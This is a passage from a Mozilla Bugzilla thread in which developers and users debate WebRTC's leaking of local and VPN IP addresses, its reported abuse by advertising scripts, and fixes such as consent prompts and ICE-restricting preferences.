| [Comment 100](/show_bug.cgi?id=959893#c100)• 10 years ago |
|  | |

(In reply to Sylvestre Ledru [:sylvestre] from [comment #99](/show_bug.cgi?id=959893#c99 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #98](/show_bug.cgi?id=959893#c98 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > > I'd also appreciate not
> > > being marked as spam, thank you!
> >
> > I didn't mark you as spam initially, so your argument there is with someone
> > else.
>
> i removed the spam tag
Why was my description of a possible vulnerability marked as "advocacy" and how was I advocating anything?

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 102](/show_bug.cgi?id=959893#c102)• 10 years ago |
|  | |

1. Public IP addresses are also sensitive, if a proxy is configured. I route all my traffic through a proxy, for anonymization. This completely unveils me.
2. From what I understand, this (DetectRTC) may currently be used as a vector to find the router in an exploit kit for to attack routers from inside network, where they are more exposed. It attacks more than 50 router models: Netgear, Belkin, Dlink, TPlink, Asus, Zyxel. Reportedly, the router attack works from a browser by just visiting a website.
<http://malware.dontneedcoffee.com/2015/05/an-exploit-kit-dedicated-to-csrf.html>
(Attention TLDRers: the pastebin code at the top is an early version of the exploit, not the current code)
<https://github.com/muaz-khan/DetectRTC/blob/master/DetectRTC.js>
This one should be easy enough to fix with a prompt. Leaving such bugs dangling leads to in situations where routers are attacked from inside, from a normal webpage, on a big scale.
Dear WebRTC team, it's your responsibility.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a43019926_22599)• 10 years ago |

Component: WebRTC → WebRTC: Signaling

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 103](/show_bug.cgi?id=959893#c103)• 10 years ago |
|  | |

Reading that, it's using DetectRTC only as a fingerprint generator to encrypt/decrypt attack code; one other part of the code shows them using a table of common LAN router IPs to use to identify the router. The site you link to shows nothing that says to me the IP detection is being used in any way to attack the routers.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 104](/show_bug.cgi?id=959893#c104)• 10 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #103](/show_bug.cgi?id=959893#c103 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Reading that, it's using DetectRTC only as a fingerprint generator to
> encrypt/decrypt attack code; one other part of the code shows them using a
> table of common LAN router IPs to use to identify the router. The site you
> link to shows nothing that says to me the IP detection is being used in any
> way to attack the routers.
Its hard to speculate on incomplete code/exploits anyways, we don't know all of its working (not that we need to). It would be nice to stick to the facts as oppose to basing off of only opinion.
Not using WebRTC in this attack is like putting candy in front of a kid and then telling him not to eat it.
by the way, my add-on does request user interaction before enabling webrtc: <https://addons.mozilla.org/en-US/firefox/addon/statutory/> -If anyone could help i would really like to convert/piggyback the toaster popup to one of the other permanent popups like getUserMedia or cam/mic access. I haven't a clue to proceed, i just know a hint of it is in the awesome bar xul area of browser.xul

|  | [Justin Dolske [:Dolske]](/user_profile?user_id=27780) |  |
| --- | --- | --- |
| [Comment 105](/show_bug.cgi?id=959893#c105)• 10 years ago |
|  | |

Apparently being used in the wild:
<https://twitter.com/incloud/status/619624021123010560>
("WebRTC being used now by embedded 3rd party on <http://nytimes.com> to report visitors' local IP addresses.")

|  | [Daniel Roesler](/user_profile?user_id=305342) |  |
| --- | --- | --- |
| [Comment 106](/show_bug.cgi?id=959893#c106)• 10 years ago |
|  | |

(In reply to Justin Dolske [:Dolske] from [comment #105](/show_bug.cgi?id=959893#c105 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Apparently being used in the wild:
>
> <https://twitter.com/incloud/status/619624021123010560>
>
> ("WebRTC being used now by embedded 3rd party on <http://nytimes.com> to
> report visitors' local IP addresses.")
I've said this before and I'll say it again. Data channels should require user consent just the same as video and audio (getUserMedia). I haven't yet heard a good reason on why a silent P2P data channel connection is required.

|  | [Anselm Hannemann](/user_profile?user_id=470859) |  |
| --- | --- | --- |
| [Comment 107](/show_bug.cgi?id=959893#c107)• 10 years ago |
|  | |

The tweet content is true from what I could reconstruct. This script (<http://s.tagsrvcs.com/2/4.10.0/loaded.js>) is the reason for it, you can easily identify the WebRTC connection. I think Firefox should do something about it top priority as it’s an exposed open bug that reveals user identity to third parties.
I think a user consent would indeed help a lot.

|  | [Adam Roach [:abr]](/user_profile?user_id=241693) |  |
| --- | --- | --- |
| [Comment 108](/show_bug.cgi?id=959893#c108)• 10 years ago |
|  | |

I'm going to leave this link here so I can find it later when I need it.
<https://github.com/w3ctag/spec-reviews/blob/master/2015/05/fingerprint.md>
I'll quote the opening sentence: "The [W3C Technical Advisory Group] believes there is a reasonably strong consensus in the industry that, against a determined attacker, combating fingerprinting \*is\* a lost cause."
The rest of the write-up is a bit more nuanced than that, but it doesn't stray from that thesis.
Relevant to this issue, I think this change in advice is probably worth pondering: "When increasing fingerprinting surface is unavoidable, prefer designs that make it detectable."

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 109](/show_bug.cgi?id=959893#c109)• 10 years ago |
|  | |

There is a big difference between "fingerprinting" (identifying/tracking a unique instance) and an IP address which is considered "personally identifiable information" in some countries. Nor are ad networks determined attackers like a gov't agency, they are opportunistic data hoarders.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 110](/show_bug.cgi?id=959893#c110)• 10 years ago |
|  | |

Totally agree with you, there is a big difference between personal metadata (like: I like the color black, play golf, and where zebra stripped pants on Sunday's) and personal identifiers such as: IP, phone#, DL#, SSN, CC etc.. Your personal metadata is stored with no value until it can be concatenated with more personal metadata and/or key identifiers.
What I want to know is: -What is the purpose of the Do Not Track Button?? - <http://postimg.org/image/ig5cratoz/> - It’s a joke right?
<https://www.mozilla.org/en-US/firefox/dnt/> (Mozilla Quote):
```
Mozilla is a global, nonprofit organization dedicated to making the Web better. We emphasize principle over profit, and believe that the Web is a shared public resource to be cared for, not a commodity to be sold. We answer to no one but you and believe it is crucial to put you in control of your online experience. We are aiming to give you better insight and control into the ways your personal information is collected, used, stored and shared online.
Mozilla Firefox offers a Do Not Track feature that lets you express a preference not to be tracked by websites. When the feature is enabled, Firefox will tell advertising networks and other websites and applications that you want to opt-out of tracking for purposes like behavioral advertising.
```

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 111](/show_bug.cgi?id=959893#c111)• 10 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #109](/show_bug.cgi?id=959893#c109 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> There is a big difference between "fingerprinting" (identifying/tracking a
> unique instance) and an IP address which is considered "personally
> identifiable information" in some countries. Nor are ad networks determined
> attackers like a gov't agency, they are opportunistic data hoarders.
This is why it's important to distinguish between VPN addresses and
local IP addresses, since the latter are generally less identifying than
the public IP address. It would indeed be nice to do something about the
VPN addresses.

|  | [(not reading bugmail) Nick Desaulniers [:\n]](/user_profile?user_id=443618) |  |
| --- | --- | --- |
| [Comment 112](/show_bug.cgi?id=959893#c112)• 10 years ago |
|  | |

"...the New York times uses WebRTC to gather your local ip addresses..." [0]
[0] <https://webrtchacks.com/dear-ny-times/>

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 113](/show_bug.cgi?id=959893#c113)• 10 years ago |
|  | |

(In reply to Jared Null from [comment #110](/show_bug.cgi?id=959893#c110 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> principle over profit
I can't help but think Mozilla is covering up a shark on the Fourth of July.

|  | [Daniel Micay](/user_profile?user_id=408546) |  |
| --- | --- | --- |
| [Comment 114](/show_bug.cgi?id=959893#c114)• 10 years ago |
|  | |

(In reply to Nick Desaulniers [:\n] from [comment #112](/show_bug.cgi?id=959893#c112 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> "...the New York times uses WebRTC to gather your local ip addresses..." [0]
>
> [0] <https://webrtchacks.com/dear-ny-times/>
There's discussion on that here:
<https://www.reddit.com/r/netsec/comments/3dgwee/how_the_new_york_times_uses_webrtc_to_gather/>
<https://news.ycombinator.com/item?id=9893561>
There's a response from one of the WebRTC developers involved with Chrome: <https://news.ycombinator.com/item?id=9895796>

|  | [awalgarg](/user_profile?user_id=528086) |  |
| --- | --- | --- |
| [Comment 115](/show_bug.cgi?id=959893#c115)• 10 years ago |
|  | |

Hi.
ecr: I see that FF is not willing to violate the IETF spec, which is a very good thing. But surely FF can allow extensions to be made which let this thing roll, like Chrome did with the commit linked above ([https://chromium.googlesource.com/chromium/src/+/7c98bab02128ae9fdc4fcc9a9df38588af86290e%5E%21/chrome/common/pref\_names.cc](https://chromium.googlesource.com/chromium/src/%2B/7c98bab02128ae9fdc4fcc9a9df38588af86290e%5E%21/chrome/common/pref_names.cc)).
Thanks,
<3

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 116](/show_bug.cgi?id=959893#c116)• 10 years ago |
|  | |

We are considering adding an extension to restrict the use of WebRTC but are still studying what would be most effective.

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122) |  |
| --- | --- | --- |
| [Comment 117](/show_bug.cgi?id=959893#c117)• 10 years ago |
|  | |

(In reply to Daniel Roesler from [comment #106](/show_bug.cgi?id=959893#c106 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> I've said this before and I'll say it again. Data channels should require
> user consent just the same as video and audio (getUserMedia). I haven't yet
> heard a good reason on why a silent P2P data channel connection is required.
I would like to second this observation. I have not attempted to dig into the details of the spec, but it \*sounds\* like the entire problem goes away if creating any sort of channel requires explicit user authorization.

|  | [kie000](/user_profile?user_id=402090) |  |
| --- | --- | --- |
| [Comment 118](/show_bug.cgi?id=959893#c118)• 10 years ago |
|  | |

I don't see why Firefox would be initiating these hidden background connections when I am not trying to use the Video-chat.
Surely the solution is to disallow WebRTC except in relation to user initiated web-chats.

|  | [Daniel Roesler](/user_profile?user_id=305342) |  |
| --- | --- | --- |
| [Comment 119](/show_bug.cgi?id=959893#c119)• 10 years ago |
|  | |

Here's a way to add user consent that is backwards compatible and doesn't break existing webapps:
1. Add a requirement to ask for user consent on RTCPeerConnection.createOffer() and RTCPeerConnection.createAnswer().
2. If there is currently a video or audio stream added to the RTCPeerConnection, check the stream for a assume that the consent requirement has been satisfied.
RTCPeerConnection.createOffer/Answer() is where the ICE candidate collection gets kicked off, so this would effectively implement an asynchronous user consent for data channels. Are there other RTCPeerConnection methods that also kick off ICE candidate collection?

|  | [ABri](/user_profile?user_id=502378) |  |
| --- | --- | --- |
| [Comment 120](/show_bug.cgi?id=959893#c120)• 10 years ago |
|  | |

(In reply to Daniel Roesler from [comment #119](/show_bug.cgi?id=959893#c119 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Here's a way to add user consent that is backwards compatible and doesn't
> break existing webapps:
>
> 1. Add a requirement to ask for user consent on
> RTCPeerConnection.createOffer() and RTCPeerConnection.createAnswer().
>
> 2. If there is currently a video or audio stream added to the
> RTCPeerConnection, check the stream for a assume that the consent
> requirement has been satisfied.
>
> RTCPeerConnection.createOffer/Answer() is where the ICE candidate collection
> gets kicked off, so this would effectively implement an asynchronous user
> consent for data channels. Are there other RTCPeerConnection methods that
> also kick off ICE candidate collection?
This is exactly what had been asked to Mozilla since spring of 2014 repeatedly - i guess it is time to do the math of mozilla refusing to do this step with such a furor. And to consider that FF isn't focussing on user privacy for some time now and to ask who benefits most from leaking IP and LAN information through VPN.

|  | [thomas](/user_profile?user_id=520612) |  |
| --- | --- | --- |
| [Comment 121](/show_bug.cgi?id=959893#c121)• 10 years ago |
|  | |

Item 4 of The Mozilla Manifesto states:
"Individuals' security and privacy on the Internet are fundamental and must not be treated as optional." - <https://www.mozilla.org/en-US/about/manifesto/>
This bug report clearly demonstrates that Firefox's WebRTC implementation, by default, treats the privacy implications of leaking internal network and gateway IP addresses to other parties as an optional consideration.
I agree with Zack Weinberg and ABri from [comment #117](/show_bug.cgi?id=959893#c117 "NEW - [meta] WebRTC Internal IP Address Leakage") & #120, what's it going to take/require to get this issue the internal resources at Mozilla it needs?

|  | [Morel Xavier](/user_profile?user_id=164448) |  |
| --- | --- | --- |
| [Comment 122](/show_bug.cgi?id=959893#c122)• 9 years ago |
|  | |

> I don't see why Firefox would be initiating these hidden background connections when I am not trying to use the Video-chat.
> Surely the solution is to disallow WebRTC except in relation to user initiated web-chats.
The data channel can be used for things besides chat (whether text, audio or video) e.g. real-time P2P games.

|  | [inscription](/user_profile?user_id=509849) |  |
| --- | --- | --- |
| [Comment 123](/show_bug.cgi?id=959893#c123)• 9 years ago |
|  | |

(In reply to Morel Xavier from [comment #122](/show_bug.cgi?id=959893#c122 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > I don't see why Firefox would be initiating these hidden background connections when I am not trying to use the Video-chat.
>
> > Surely the solution is to disallow WebRTC except in relation to user initiated web-chats.
>
> The data channel can be used for things besides chat (whether text, audio or
> video) e.g. real-time P2P games.
Indeed.
There are many use cases for webRTC through the data channel : multiplayer games, file transferts, p2p content delivery, control of IoT devices and so on.

|  | [The 8472](/user_profile?user_id=176019) |  |
| --- | --- | --- |
| [Comment 124](/show_bug.cgi?id=959893#c124)• 9 years ago |
|  | |

> There are many use cases for webRTC through the data channel
That does not preclude prompting the user for granting the necessary permissions.
While many might tick "yes" even if the browser asked them if it's ok to burn down their house, those who care about privacy at least should have the option to say "no".
Smartphone or chrome's app store enumerate the permissions that an app/extension requests. Users can handle that. The same can and should apply for websites that "need" advanced features to work.

|  | [Morel Xavier](/user_profile?user_id=164448) |  |
| --- | --- | --- |
| [Comment 125](/show_bug.cgi?id=959893#c125)• 9 years ago |
|  | |

to The 8472 from [comment #124](/show_bug.cgi?id=959893#c124 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > There are many use cases for webRTC through the data channel
>
> That does not preclude prompting the user for granting the necessary
> permissions.
Of course not, this was a response to a comment stating that there was no cause for data connections outside of "chat". The comment you quote doesn't state that data WebRTC must be invisible/unprompted, only that there are plenty of non-chat data WebRTC use cases.

|  | [bug.zilla](/user_profile?user_id=432697) |  |
| --- | --- | --- |
| [Comment 126](/show_bug.cgi?id=959893#c126)• 9 years ago |
|  | |

uBlobk Origin purports to block WebRTC IP leaking:
<http://www.ghacks.net/2015/07/02/you-can-block-webrtc-from-leaking-your-ip-now-in-ublock-origin/>
I tested it and it appears to work.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a48483423_11539)• 9 years ago |

See Also: → [1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")

|  | [Maire Reavy [:mreavy]](/user_profile?user_id=74434) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a48483487_74434)• 9 years ago |

Keywords: [meta](/buglist.cgi?keywords=meta&resolution=---)

|  | [Edward Rudd](/user_profile?user_id=23562) |  |
| --- | --- | --- |
| [Comment 127](/show_bug.cgi?id=959893#c127)• 9 years ago |
|  | |

I have concerns with limiting what ICE candidates are provided. As we (HumbleBundle) are trying to build out a multiplayer system on top of WebRTC Data Channel. And limiting ice candidates to not include LAN addresses will punish players are actually ARE behind the same firewall on the same LAN. And WebRTC provides these addresses by design for that purpose.
We need to find a way to prevent the advertising from abusing a (yet another) piece of useful technology without destroying it's functionality.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 128](/show_bug.cgi?id=959893#c128)• 9 years ago |
|  | |

Nice to know Mozilla is running on at least three cylinders of communication, just received this email through the mozilla-dev-media@lists.mozilla.org channel:
Mozilla will soon be landing a series of capabilities to allow users to
control many aspects of how ICE candidates are gathered and used.
These include, but aren't limited to, methods to restrict the use of
interfaces to either the default route or a whitelisted interface; ability
to force use of relay candidates only; to override application
specification of ICE servers with a user-specified value (i.e. force use of
a border TURN server); and methods to allow extensions to validate if a
user has intended to allow use of a PeerConnection. We also are looking
into methods to expose 'background' PeerConnections short of blocking all
of them or requiring explicit opt-in ahead of time, and how to record what
uses PeerConnections, and for what.
The meta/tracking bug is \*[Bug 1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")\*
<[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")>.
We expect many of these new tools to be available soon in Firefox Beta 41
(shortly after 40 goes to release in a few weeks).
Most of these capabilities will be available initially as interfaces that
extensions can enable or users can flip on via about:config.
--
Maire Reavy

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a48543394_34122)• 9 years ago |

Blocks: [1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")

|  | [Zack Weinberg (:zwol)](/user_profile?user_id=34122) |  |
| --- | --- | --- |
| [Comment 129](/show_bug.cgi?id=959893#c129)• 9 years ago |
|  | |

(In reply to Edward Rudd from [comment #127](/show_bug.cgi?id=959893#c127 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> I have concerns with limiting what ICE candidates are provided. As we
> (HumbleBundle) are trying to build out a multiplayer system on top of WebRTC
> Data Channel. And limiting ice candidates to not include LAN addresses will
> punish players are actually ARE behind the same firewall on the same LAN.
> And WebRTC provides these addresses by design for that purpose.
>
> We need to find a way to prevent the advertising from abusing a (yet
> another) piece of useful technology without destroying it's functionality.
Would explicit user authorization to create data channels (as suggested several times above) be acceptable for your use case?

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a48546637_373403)• 9 years ago |

No longer blocks: [1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")Depends on: [1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")

|  | [Edward Rudd](/user_profile?user_id=23562) |  |
| --- | --- | --- |
| [Comment 130](/show_bug.cgi?id=959893#c130)• 9 years ago |
|  | |

(In reply to Zack Weinberg (:zwol) from [comment #129](/show_bug.cgi?id=959893#c129 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Edward Rudd from [comment #127](/show_bug.cgi?id=959893#c127 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > I have concerns with limiting what ICE candidates are provided. As we
> > (HumbleBundle) are trying to build out a multiplayer system on top of WebRTC
> > Data Channel. And limiting ice candidates to not include LAN addresses will
> > punish players are actually ARE behind the same firewall on the same LAN.
> > And WebRTC provides these addresses by design for that purpose.
> >
> > We need to find a way to prevent the advertising from abusing a (yet
> > another) piece of useful technology without destroying it's functionality.
>
> Would explicit user authorization to create data channels (as suggested
> several times above) be acceptable for your use case?
It largely depends on how it's built. both in how it's exposed to the user (so they can easily accept/reject) as well as to the developer (so they know how to handle the scenario when the user hasn't responded YET, vs rejecting them outright)
Would we simply hold the response to the initiation callback until the user definitely accepts or rejects the Data request? And would the user be able to say "always allow on this domain"?
Another question is how is this going to be handle with respect to iframes? As we are providing an 'iframe' widget that a game developer can embed in their own website to allow them to sell their game as well as allow users play the asm.js port (which may include networking). (see [Bug #1147821](/show_bug.cgi?id=1147821 "RESOLVED FIXED - Only disable IndexedDB in third-party windows when the third-party cookie preference is set")).

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 131](/show_bug.cgi?id=959893#c131)• 9 years ago |
|  | |

Hey ekr, could you please give this bug some love?
Threat:
1. This is being used actively my third parties on nytimes.com to find local IP addresses of visitors ([comment 105](/show_bug.cgi?id=959893#c105 "NEW - [meta] WebRTC Internal IP Address Leakage"))
2. Probably also used as an attack vector to discover router IPs, which are then easy victims for (other, indepedent) router exploits ([comment 102](/show_bug.cgi?id=959893#c102 "NEW - [meta] WebRTC Internal IP Address Leakage"))
3. This reveals local IPs and identifies surfers. The local network topology has always been considered secret, esp. if browsers are behind a proxy. I use a proxy \*specifically\* to anonymize, and this effort is being dwarfed by this bug (my local IP is unusual). The same would be true for anonymizing VPN users. (So, you unfortunately can't rely on proxy config as indication.)
Given that this is actively and widely used to unmask users who specifically try to stay anonymous, I think it's urgent to fix this.
Possible fixes:
\* Data channels MUST require user consent, just like cam/mic. ([comment 106](/show_bug.cgi?id=959893#c106 "NEW - [meta] WebRTC Internal IP Address Leakage") and others)
\* Even with consent to communication, local IP addresses MUST NOT be sent in the request unless explicitly approved.Assignee: nobody → ekr

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 132](/show_bug.cgi?id=959893#c132)• 9 years ago |
|  | |

Maire has already announced our plan of record:
<https://groups.google.com/forum/#!topic/mozilla.dev.media/L6Rx9ubSjMc>
And I'm presently working on the technical underpinnings to restrict
use of non-default addresses:
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189041](/show_bug.cgi?id=1189041 "RESOLVED FIXED - Add about:config pref to limit ICE discovery to default route")
As Maire indicated, that setting will be opt-in for now (as in Chrome).Assignee: ekr → nobody

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 133](/show_bug.cgi?id=959893#c133)• 9 years ago |
|  | |

> that setting will be opt-in for now
As I said, that's not good enough.
a) you can't expect users to know about this. Protection needs to be the default.
b) an opt-in will do nothing to stop security attacks.

|  | [Peter Ansell](/user_profile?user_id=278403) |  |
| --- | --- | --- |
| [Comment 134](/show_bug.cgi?id=959893#c134)• 9 years ago |
|  | |

It may be more appropriate to refer to it as "opt-out", based on similar terminology for other privacy related issues, as the user making a configuration change will reduce the amount of personal information being leaked. Hence, the user would be "opting-out" of the default which exposes personal information.
Using either terminology though, it isn't good enough that the user needs to know about this option and manually make a change to stop NYTimes knowing what their internal network addresses are, for whatever reason they decided to start using it.

|  | [Ale](/user_profile?user_id=208258) |  |
| --- | --- | --- |
| [Comment 135](/show_bug.cgi?id=959893#c135)• 9 years ago |
|  | |

This is a \*very\* serious privacy issue (basically it is almost like having a JS API like "getLocalIPAddress()"...), especially because it mainly concerns people who might care about privacy (individuals using VPNs or proxy servers to conceal their location and/or identity, companies having the structure of their internal networks exposed...). I can't believe that such a serious issue is still affecting Firefox 18 months after it was discovered! Especially when thinking about what the Mozilla Manifesto says (see [comment #121](/show_bug.cgi?id=959893#c121 "NEW - [meta] WebRTC Internal IP Address Leakage")).
I think that ANY function that might expose private information (such as an internal IP address) MUST be authorized by the user BY DEFAULT. Users have to be informed about what is happening. I never worked on Firefox source code, but I can't believe it takes 18 months to find a way to implement a user authorization system for that without breaking existing applications.
Is there any clear roadmap about solving this bug?

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 136](/show_bug.cgi?id=959893#c136)• 9 years ago |
|  | |

I totally agree with you Ale, very long time for something like this to get attention, i haven't seen any cables come through the tickets besides just technical whys and why nots, so hard to know what Mozilla's agenda is or how far they go here, but progress is being made, so its worth just sitting back and waiting IMHO.
between [comment 126](/show_bug.cgi?id=959893#c126 "NEW - [meta] WebRTC Internal IP Address Leakage") & 127
parent bug: [https://bugzilla.mozilla.org/show\_bug.cgi?id=1189167](/show_bug.cgi?id=1189167 "NEW - [meta] ICE candidate generation control and user authorization")
children bugs
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189036](/show_bug.cgi?id=1189036 "NEW - Add a user pref to turn on forced relay-only operation for WebRTC")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189040](/show_bug.cgi?id=1189040 "RESOLVED FIXED - Add an about:config pref with a whitelist for interfaces to use for ICE (in WebRTC)")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189055](/show_bug.cgi?id=1189055 "RESOLVED DUPLICATE - Allow or require ICE TCP to go through an HTTP proxy when making connections")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189030](/show_bug.cgi?id=1189030 "VERIFIED FIXED - Add an about:config pref to disable non-relay ICE candidates")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189044](/show_bug.cgi?id=1189044 "RESOLVED FIXED - Add about:config pref to force use of a specific TURN server always")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189044](/show_bug.cgi?id=1189044 "RESOLVED FIXED - Add about:config pref to force use of a specific TURN server always")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189060](/show_bug.cgi?id=1189060 "RESOLVED FIXED - Add hooks to allow an extension to hook into createOffer() and createAnswer()")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=1189097](/show_bug.cgi?id=1189097 "RESOLVED WONTFIX - Make it possible to determine if a track was allowed via user-mediated permission")
[https://bugzilla.mozilla.org/show\_bug.cgi?id=959893](/show_bug.cgi?id=959893 "NEW - [meta] WebRTC Internal IP Address Leakage")

|  | [Clement Cherlin](/user_profile?user_id=10370) |  |
| --- | --- | --- |
| [Comment 137](/show_bug.cgi?id=959893#c137)• 9 years ago |
| advocacy | |

| Comment hidden (advocacy) |  |
| --- | --- |

WebRTC must be disabled by default in all Mozilla products until this bug is fixed. Privacy must be opt-out, not opt-in.
Unless, of course, individuals' security and privacy on the Internet are optional.

|  | [Thomas Auge](/user_profile?user_id=524379) |  |
| --- | --- | --- |
| [Comment 138](/show_bug.cgi?id=959893#c138)• 9 years ago |
|  | |

Ali Express abuses this on their login page (together with some other shady techniques).

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
| [Comment 139](/show_bug.cgi?id=959893#c139)• 9 years ago |
|  | |

Can we turn this on by default to fix this for all users, now that ICE is implemented?
media.peerconnection.ice.default\_address\_only = true
From what I understand, on Windows/Linux this tells firefox to only advertise via the default routes to the stun server.
My understanding is that with this, private ips no longer leak, and private-to-private ip connections within the same subnet are limited to things like WAN Redirect or public relays -- which seems to make sense because it decides what to trust based on the host and network setup.
On top of the, default\_address\_only seems to play nice with VPNs - and doesn't disclose addresses of things like VPNs.
Is there any reason this is undesirable for a default?

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
| [Comment 140](/show_bug.cgi?id=959893#c140)• 9 years ago |
|  | |

For reference:
<https://wiki.mozilla.org/Media/WebRTC/Privacy>

|  | [Adam Roach [:abr]](/user_profile?user_id=241693) |  |
| --- | --- | --- |
| [Comment 141](/show_bug.cgi?id=959893#c141)• 9 years ago |
|  | |

Firefox will almost certainly address this problem using the approach described in <https://tools.ietf.org/html/draft-ietf-rtcweb-ip-handling-01> (or the final form of that document, once it is approved to be published as an RFC).
(In reply to Dave Andrews from [comment #139](/show_bug.cgi?id=959893#c139 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Can we turn this on by default to fix this for all users, now that ICE is
> implemented?
>
> media.peerconnection.ice.default\_address\_only = true
That does not work in e10s. Also, it ruins the ability to have low-latency, high bandwidth communications that would be otherwise possible under many network configurations.

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581) |  |
| --- | --- | --- |
| [Comment 142](/show_bug.cgi?id=959893#c142)• 9 years ago |
|  | |

(In reply to Adam Roach [:abr] from [comment #141](/show_bug.cgi?id=959893#c141 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> That does not work in e10s.
FYI as [bug 1194259](/show_bug.cgi?id=1194259 "RESOLVED FIXED - Make ICE IP restriction to default routes work in E10S") has been fixed it actually should work with e10s - looks like the wiki page should be updated.
But another dis-advantage of this solution is that is not mentioned on the wiki page is that it breaks all calling services which provide intra-LAN calls only (as this option suppresses local candidates).

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
| [Comment 143](/show_bug.cgi?id=959893#c143)• 9 years ago |
|  | |

Thanks Adam. Reading the draft, it sounds like this option corresponds with "Mode 3".
media.peerconnection.ice.default\_address\_only = true
Draft says "
We recommend Mode 1 as the default behavior only if cam/mic
permission has been granted, or Mode 2 if this is not the case.
"
Both modes 1 and 2 leak the private IP according to their descriptions
The document goes on to say this:
"If the client is behind a NAT, the client's private IP addresses, typically [RFC1918] addresses, can be learned."
and then blatantly disregards the issue presented in the description of that RFC and this very bug here:
" #1 is considered to be the least significant concern, given that the
local address values often contain minimal information (e.g.
192.168.0.2), or have built-in privacy protection (e.g. [RFC4941]
IPv6 addresses).
"
Frankly it doesn't sound like they made any case for the tradeoffs between privacy vs media performance at all. It looks like they blatantly traded everything for performance by summarily stating that private ips contain "minimal information" -- when the reality is that someone's subnet/allocation (or worse MANY subnet/allocations in the case of multiple interfaces + VMs) can tell a public Html/JavaScript context quite a lot about the identity of who they're serving amidst a set of other users within a subnet, or behind any given public ip -- on any given day, even long after any particular local media performance needs have met their objectives.
This is not a tradeoff! This was completely disregarded.
Another aspect of this that seriously concerns me is that this is the first time in the history of the HTML/JavaScript spec that we've completely disregarded the concept of public/private zoning. In any other resource or protocol that's accessed by any HTML/JavaScript context today, it is considered insecure to access private resources or any information about them from sites loaded from public zones.
Now suddenly because someone invents a new protocol that needs to move information whos' nature is completely untrusted between private resources, it is considered practically permissible to run in the face of all that past zoning work -- and to start revealing privately zoned information.
... Information that does not even necessarily belong to the browser, nor is it necessarily authorized by the user (or their network) to be permissibly public information!
This has not been vetted, and while we're on the subject of private vs public resources, I'm curious: Are there even any dialogs to ask users whether there's a potential to expose private information about their network, its resources, or its structure when a web page is loaded? Or is all this private information just being loaded for the public zone because we're anticipating that we're about to disregard the privacy implications that follow once private connections are established there as well?

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
